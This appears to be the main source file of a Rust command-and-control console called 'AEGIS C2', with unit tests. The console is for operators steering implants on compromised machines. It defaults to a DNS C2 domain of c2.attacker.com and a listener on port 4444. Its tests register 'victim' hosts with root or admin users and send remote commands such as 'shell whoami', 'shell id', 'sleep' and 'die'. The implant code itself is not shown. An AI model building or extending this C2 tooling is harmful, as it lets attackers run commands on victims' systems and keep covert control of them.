mod app;
mod ui;

use app::App;
use clap::Parser;

/// AEGIS C2 — Command & Control Operator Console
#[derive(Parser, Debug)]
#[command(name = "aegis-c2", about = "C2 operator console for AEGIS implants")]
struct Cli {
    /// C2 listener address
    #[arg(long, default_value = "127.0.0.1:4444")]
    listen: String,

    /// DNS C2 base domain
    #[arg(long, default_value = "c2.attacker.com")]
    dns_domain: String,

    /// Session encryption key (hex, 64 chars)
    #[arg(long)]
    key: Option<String>,

    /// Export session transcript on exit
    #[arg(long)]
    export: Option<String>,
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();
    let mut app = App::new(&cli.listen, &cli.dns_domain, cli.key.as_deref());

    let result = ui::run_tui(&mut app);

    if let Some(path) = &cli.export {
        let transcript = app.export_transcript();
        std::fs::write(path, transcript)?;
    }

    result
}

#[cfg(test)]
mod tests {
    use super::app::*;

    #[test]
    fn test_app_creation() {
        let app = App::new("127.0.0.1:4444", "c2.test.com", None);
        assert_eq!(app.dns_domain(), "c2.test.com");
        assert!(app.implants().is_empty());
    }

    #[test]
    fn test_add_implant() {
        let mut app = App::new("127.0.0.1:4444", "c2.test.com", None);
        app.add_implant(ImplantInfo {
            id: "imp-001".to_string(),
            hostname: "victim-1".to_string(),
            username: "root".to_string(),
            os: "Linux 6.1".to_string(),
            ip: "10.0.0.5".to_string(),
            last_seen: 1700000000,
            sleep_secs: 60,
        });
        assert_eq!(app.implants().len(), 1);
        assert_eq!(app.implants()[0].id, "imp-001");
    }

    #[test]
    fn test_select_implant() {
        let mut app = App::new("127.0.0.1:4444", "c2.test.com", None);
        app.add_implant(ImplantInfo {
            id: "imp-001".to_string(),
            hostname: "box1".to_string(),
            username: "admin".to_string(),
            os: "Windows".to_string(),
            ip: "10.0.0.1".to_string(),
            last_seen: 0,
            sleep_secs: 30,
        });
        app.add_implant(ImplantInfo {
            id: "imp-002".to_string(),
            hostname: "box2".to_string(),
            username: "root".to_string(),
            os: "Linux".to_string(),
            ip: "10.0.0.2".to_string(),
            last_seen: 0,
            sleep_secs: 30,
        });
        app.select_next();
        assert_eq!(app.selected_index(), 1);
        app.select_prev();
        assert_eq!(app.selected_index(), 0);
    }

    #[test]
    fn test_command_history() {
        let mut app = App::new("127.0.0.1:4444", "c2.test.com", None);
        app.add_implant(ImplantInfo {
            id: "imp-001".to_string(),
            hostname: "box1".to_string(),
            username: "root".to_string(),
            os: "Linux".to_string(),
            ip: "10.0.0.1".to_string(),
            last_seen: 0,
            sleep_secs: 30,
        });
        app.execute_command("shell whoami");
        let history = app.command_history("imp-001");
        assert_eq!(history.len(), 1);
        assert!(history[0].input.contains("whoami"));
    }

    #[test]
    fn test_parse_command() {
        let (cmd, args) = App::parse_command_input("shell ls -la /tmp");
        assert_eq!(cmd, "shell");
        assert_eq!(args, "ls -la /tmp");

        let (cmd2, args2) = App::parse_command_input("die");
        assert_eq!(cmd2, "die");
        assert_eq!(args2, "");

        let (cmd3, args3) = App::parse_command_input("sleep 120");
        assert_eq!(cmd3, "sleep");
        assert_eq!(args3, "120");
    }

    #[test]
    fn test_export_transcript() {
        let mut app = App::new("127.0.0.1:4444", "c2.test.com", None);
        app.add_implant(ImplantInfo {
            id: "imp-001".to_string(),
            hostname: "box1".to_string(),
            username: "root".to_string(),
            os: "Linux".to_string(),
            ip: "10.0.0.1".to_string(),
            last_seen: 0,
            sleep_secs: 30,
        });
        app.execute_command("shell id");
        let transcript = app.export_transcript();
        assert!(transcript.contains("AEGIS C2 Session Transcript"));
        assert!(transcript.contains("imp-001"));
        assert!(transcript.contains("shell id"));
    }

    #[test]
    fn test_input_handling() {
        let mut app = App::new("127.0.0.1:4444", "c2.test.com", None);
        app.push_input('h');
        app.push_input('i');
        assert_eq!(app.input(), "hi");
        app.pop_input();
        assert_eq!(app.input(), "h");
        app.clear_input();
        assert_eq!(app.input(), "");
    }

    #[test]
    fn test_multiple_implant_histories() {
        let mut app = App::new("127.0.0.1:4444", "c2.test.com", None);
        app.add_implant(ImplantInfo {
            id: "a".to_string(),
            hostname: "ha".to_string(),
            username: "u".to_string(),
            os: "os".to_string(),
            ip: "1.1.1.1".to_string(),
            last_seen: 0,
            sleep_secs: 30,
        });
        app.add_implant(ImplantInfo {
            id: "b".to_string(),
            hostname: "hb".to_string(),
            username: "u".to_string(),
            os: "os".to_string(),
            ip: "2.2.2.2".to_string(),
            last_seen: 0,
            sleep_secs: 30,
        });

        // Command on first implant
        app.execute_command("shell whoami");
        assert_eq!(app.command_history("a").len(), 1);
        assert_eq!(app.command_history("b").len(), 0);

        // Switch to second implant
        app.select_next();
        app.execute_command("shell id");
        assert_eq!(app.command_history("a").len(), 1);
        assert_eq!(app.command_history("b").len(), 1);
    }
}
